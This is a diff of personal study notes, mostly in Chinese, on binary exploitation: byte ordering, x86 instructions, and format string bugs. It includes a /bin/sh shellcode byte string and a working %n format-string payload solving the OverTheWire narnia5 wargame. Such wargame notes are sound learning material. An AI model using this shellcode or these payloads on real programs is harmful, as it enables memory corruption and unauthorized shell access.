@@ -1,5 +1,8 @@
-Byte ordering
+### Byte ordering
+
 ![image](https://slideplayer.com/slide/9303999/28/images/9/Byte+ordering+function+calls+%282%2F6%29.jpg)
+
+![image](https://i.stack.imgur.com/fManS.png)
 
 ## 16进制hex里面每个字符(0->f)都代表4个bit
 32位有8个hex decimal (4*8=32bits)
@@ -99,9 +102,12 @@ getString:
 	db "/bin/sh"
 
 \xeb\x0b\x31\xc0\x5b\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
-
-
 ```
+
+## x86 Instructions 
+
+The instruction ['test'](https://stackoverflow.com/a/13064985)
+
 
 ## NOP(No operation performed)
 
@@ -149,10 +155,7 @@ $(echo -n -e "\x31\xc0\x50\x68\x2f") >> inputFile 在已有内容的后面添加
 - 
 
 ### Format string vulnerability 
-Overthewire - narnia5
-
 针对printf家族的函数
-
 
 ```
 如果str来源不安全,
@@ -166,3 +169,25 @@ printf(str); 就能被攻击。
 在printf那一行下一个断点，这一刻的stack：
 
 ![illlustration](./format_string_stack.png)
+
+#### overthewire-narnia5
+
+```
+/narnia/narnia5 $(python -c 'print "\xd0\xd6\xff\xff"+"A"*496+"%n"')
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
+i = 1 (0xffffd4d0)
+```
+程序有提示i的地址，有时候不知为啥会变一点
+
+solution:
+```
+/narnia/narnia5 $(python -c 'print "\xd0\xd6\xff\xff"+"A"*496+"%n"')
+```
+前四个byte \xd0\xd6\xff\xff 是main里整数变量i little endian版的地址，目标是把i的值从1改到500，由于已经有四个byte了，加496就是500，所以加一堆‘A'来凑数，最后%n是specifier，它的功能是把format string里%n之前的字符串长度写到一个int *地址里，正常使用是：
+```
+int x = 0;
+printf("123%n", &x);
+```
+x就变成了3（“123”的长度）
+利用这个specifier来写入进程里任意内存地址
